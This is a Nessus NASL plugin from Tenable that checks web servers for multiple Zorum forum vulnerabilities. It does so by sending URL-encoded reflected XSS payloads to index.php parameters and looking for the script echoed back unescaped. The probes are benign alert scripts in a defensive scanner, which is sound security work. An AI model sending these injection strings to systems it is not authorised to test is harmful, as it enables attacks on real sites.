#
# (C) Tenable Network Security
#


if (description) {
  script_id(17312);
  script_version("$Revision: 1.19 $");

  script_cve_id("CVE-2005-0675", "CVE-2005-0676", "CVE-2005-0677", "CVE-2005-2651", "CVE-2005-4619", "CVE-2006-3332");
  script_bugtraq_id(12777, 14601, 16131, 18681);
  script_xref(name:"OSVDB", value:"21372");

  script_name(english:"Multiple Remote Vulnerabilities in Zorum <= 3.5");
  script_summary(english:"Checks for multiple remote vulnerabilities in Zorum <= 3.5");
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP application that is affected by
numerous flaws. 

Description :

The remote host is running Zorum, an open-source electronic forum
written in PHP. 

The version of Zorum installed on the remote host is prone to numerous
flaws, including remote code execution, privilege escalation, and SQL
injection. 

See also :

http://securitytracker.com/id?1013365
http://retrogod.altervista.org/zorum.html
http://pridels.blogspot.com/2005/11/zorum-forum-35-rollid-sql-inj-vuln.html
http://pridels.blogspot.com/2006/06/zorum-forum-35-vuln.html

Solution :

Remove the software as it is no longer maintained.

Risk factor :

Medium / CVSS Base Score : 6.9
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:N)";
  script_description(english:desc["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencie("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);
if (get_kb_item("www/" + port + "/generic_xss")) exit(0);


# A simple alert.
xss = string('<script>alert("', SCRIPT_NAME, '")</script>');
# nb: the url-encoded version is what we need to pass in.
exss = urlencode(str:xss);


# Loop through directories.
if (thorough_tests) dirs = make_list("/zorum", "/forum", cgi_dirs());
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try various XSS exploits.
  exploits = make_list(
    '/index.php?list="/%3e' + exss,
    '/index.php?method="/%3e' + exss,
    '/index.php?method=markread&list=zorumuser&fromlist=secmenu&frommethod="/%3e' + exss
  );

  foreach exploit (exploits) {
    req = http_get(item:string(dir, exploit), port:port);
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (res == NULL) exit(0);

    # It's a problem if we see our XSS.
    if (string("Method is not allowed : ", xss) >< res) {
      security_warning(port);
      exit(0);
    }
  }
}
